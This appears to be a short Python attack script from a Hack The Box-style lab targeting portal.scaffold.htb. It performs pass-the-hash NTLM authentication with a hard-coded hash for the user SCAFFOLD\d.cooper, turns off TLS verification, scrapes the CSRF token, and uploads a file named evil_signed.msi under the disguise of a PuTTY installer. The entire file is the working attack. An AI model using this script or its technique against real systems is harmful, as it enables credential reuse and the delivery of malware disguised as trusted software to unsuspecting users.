#!/usr/bin/python3
import requests
import urllib3
from bs4 import BeautifulSoup
from requests_ntlm import HttpNtlmAuth

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HASH = "aad3b435b51404eeaad3b435b51404ee:8bf305c62b94c9def1c5c30fb24ff2b8"
URL = "https://portal.scaffold.htb/Package/Upload"
USERNAME = r"SCAFFOLD\d.cooper"
MSI_FILE = "evil_signed.msi"

s = requests.Session()
s.verify = False
s.auth = HttpNtlmAuth(USERNAME, HASH)

r = s.get(URL)
print("[+] GET status:", r.status_code)

soup = BeautifulSoup(r.text, "html.parser")
token_input = soup.find("input", {"name": "__RequestVerificationToken"})
if not token_input:
    print("[-] CSRF token not found!")
    exit(1)
token = token_input["value"]
print("[+] CSRF token obtained")

with open(MSI_FILE, "rb") as f:
    r = s.post(
        URL,
        data={"__RequestVerificationToken": token},
        files={"file": ("putty-64bit-99.0-installer_signed.msi", f, "application/x-msi")},
        allow_redirects=False
    )

print("[+] Upload status:", r.status_code)
print("[+] Location:", r.headers.get("Location"))
print(r.text[:500])
